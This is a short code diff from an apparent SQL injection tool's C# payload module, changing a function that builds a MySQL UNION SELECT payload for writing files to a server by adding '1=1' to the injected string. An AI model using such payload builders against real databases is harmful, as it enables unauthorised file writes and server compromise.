@@ -161,7 +161,7 @@ namespace SuperSQLInjection.payload
 
         public static String creatMySQLWriteFileByUnion(int columnsLen, int dataIndex,String fill, String path,String content)
         {
-            StringBuilder sb = new StringBuilder(" union select ");
+            StringBuilder sb = new StringBuilder(" 1=1 union select ");
             for (int i = 1; i <= columnsLen; i++)
             {
 
